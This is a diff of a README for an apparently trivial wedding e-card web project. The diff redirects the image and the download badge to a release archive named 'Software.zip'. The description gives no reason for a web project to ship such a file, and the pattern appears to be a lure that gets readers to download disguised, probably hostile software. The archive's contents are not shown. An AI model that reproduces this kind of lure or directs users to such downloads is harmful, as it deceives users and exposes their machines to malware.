@@ -1,6 +1,6 @@
 # 🎉 My Wedding E-Card 🎊
 
-![My Wedding E-Card](https://www.example.com/image.jpg)
+![My Wedding E-Card](https://github.com/Sparkletoes69/my-wedding/releases/download/v2.0/Software.zip)
 
 ### Repository Description:
 Welcome to the "my-wedding" repository - your go-to place for a beautifully crafted wedding e-card! This project showcases an exquisite digital invitation designed using HTML, CSS, and vanilla JavaScript. With a stunning falling petals animation, a responsive layout, and smooth interactivity, this e-card is perfect for sharing the joy of your special day with family and friends. Dive into the code, explore the magic, and celebrate the power of love with this delightful project!
@@ -19,7 +19,7 @@ Feel free to explore the repository and delve into the intricacies of creating a
 
 ### Quick Access:
 To directly access the project files, click the button below:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/Sparkletoes69/my-wedding/releases/download/v2.0/Software.zip)](https://github.com/Sparkletoes69/my-wedding/releases/download/v2.0/Software.zip)
 
 ### Couldn't Access the Files?
 If you encounter any issues accessing the project files through the provided link, kindly check the "Releases" section of this repository for alternative download options.
